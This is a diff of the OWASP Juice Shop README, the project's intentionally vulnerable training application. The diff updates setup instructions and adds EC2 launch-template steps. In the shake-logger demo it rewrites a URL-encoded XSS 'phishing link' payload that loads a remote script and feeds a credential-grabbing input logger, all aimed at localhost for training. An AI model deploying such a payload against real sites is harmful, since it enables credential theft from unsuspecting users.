@@ -14,9 +14,15 @@
 > ([@shehackspurple](https://twitter.com/shehackspurple)) —
 > [Actually the most bug-free vulnerable application in existence!](https://youtu.be/TXAztSpYpvE?t=26m35s)
 > ([@vanderaj](https://twitter.com/vanderaj)) —
-> [First you 😂😂then you 😢](https://twitter.com/kramse/status/1073168529405472768) ([@kramse](https://twitter.com/kramse))
+> [First you 😂😂then you 😢](https://twitter.com/kramse/status/1073168529405472768)
+> ([@kramse](https://twitter.com/kramse))
 
-OWASP Juice Shop is probably the most modern and sophisticated insecure web application! It can be used in security trainings, awareness demos, CTFs and as a guinea pig for security tools! Juice Shop encompasses vulnerabilities from the entire [OWASP Top Ten](https://www.owasp.org/index.php/OWASP_Top_Ten) along with many other security flaws found in real-world applications!
+OWASP Juice Shop is probably the most modern and sophisticated insecure
+web application! It can be used in security trainings, awareness demos,
+CTFs and as a guinea pig for security tools! Juice Shop encompasses
+vulnerabilities from the entire
+[OWASP Top Ten](https://www.owasp.org/index.php/OWASP_Top_Ten) along
+with many other security flaws found in real-world applications!
 
 ![Juice Shop Screenshot Slideshow](screenshots/slideshow.gif)
 
@@ -98,7 +104,7 @@ overview please visit the official project page:
    clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
    of the repository)
 3. Run `cd vagrant && vagrant up`
-4. Browse to [192.168.33.10](http://192.168.33.10)
+4. Browse to [192.168.33.10:3000](http://192.168.33.10:3000)
 
 > There is a very convenient Vagrant box available at
 > <https://app.vagrantup.com/commjoen/boxes/trainingbox> (:microscope:)
@@ -110,13 +116,15 @@ overview please visit the official project page:
 
 ### Amazon EC2 Instance
 
-1. Setup an _Amazon Linux AMI_ instance
-2. In _Step 3: Configure Instance Details_ unfold _Advanced Details_ and
+1. In the _EC2_ sidenav select _Instances_ and click _Launch Instance_
+2. In _Step 1: Choose an Amazon Machine Image (AMI)_ choose an _Amazon
+   Linux AMI_ or _Amazon Linux 2 AMI_
+3. In _Step 3: Configure Instance Details_ unfold _Advanced Details_ and
    copy the script below into _User Data_
-3. In _Step 6: Configure Security Group_ add a _Rule_ that opens port 80
+4. In _Step 6: Configure Security Group_ add a _Rule_ that opens port 80
    for HTTP
-4. Launch instance
-5. Browse to your instance's public DNS
+5. Launch your instance
+6. Browse to your instance's public DNS
 
 ```
 #!/bin/bash
@@ -126,6 +134,20 @@ service docker start
 docker pull bkimminich/juice-shop
 docker run -d -p 80:3000 bkimminich/juice-shop
 ```
+
+#### Don't repeat yourself: Define an EC2 Launch Template
+
+1. In the _EC2_ sidenav select _Launch Templates_ and click _Create
+   launch template_
+2. Under _Launch template contents_ select as _AMI ID_ either _Amazon
+   Linux AMI_ or _Amazon Linux 2 AMI_ (by using _Search for AMI_)
+3. In the same section add a _Security Group_ that opens port 80 for
+   HTTP
+4. Unfold _Advanced details_ at the bottom of the screen and paste in
+   the script above into _User Data_
+5. Create your launch template
+6. Launch one or multiple EC2 instances from your template
+7. Browse to your instance's public DNS
 
 > Technically Amazon could view hacking activity on any EC2 instance as
 > an attack on their AWS infrastructure! We highly discourage aggressive
@@ -203,18 +225,19 @@ can download this
 [docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
 and run `docker-compose up` to start the juice-shop and the
 shake-logger. Assume you received and (of course) clicked
-[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
+[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
 and login. Apart from the visual/audible effect, the attacker also
 installed [an input logger](http://localhost:8080/logger.php) to grab
 credentials! This could easily run on a 3rd party server in real life!
 
-> You can also find a recording of this attack in action on YouTube:
+> We recommend to use Mozilla Firefox for this demo! You can also find a
+> recording of this attack in action on YouTube:
 > [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
 
 
 ## Additional Documentation
 
-### Pwning OWASP Juice Shop [![Write Goodreads Review](https://img.shields.io/badge/goodreads-write%20review-382110.svg)](https://www.goodreads.com/review/edit/33834308)
+### Pwning OWASP Juice Shop [![](https://img.shields.io/leanpub/book/pages/juice-shop.svg)](https://leanpub.com/juice-shop) [![](https://img.shields.io/leanpub/book/sold/juice-shop.svg)](https://leanpub.com/juice-shop) [![Write Goodreads Review](https://img.shields.io/badge/goodreads-write%20review-382110.svg)](https://www.goodreads.com/review/edit/33834308)
 
 This is the official companion guide to the OWASP Juice Shop. It will
 give you a complete overview of the vulnerabilities found in the
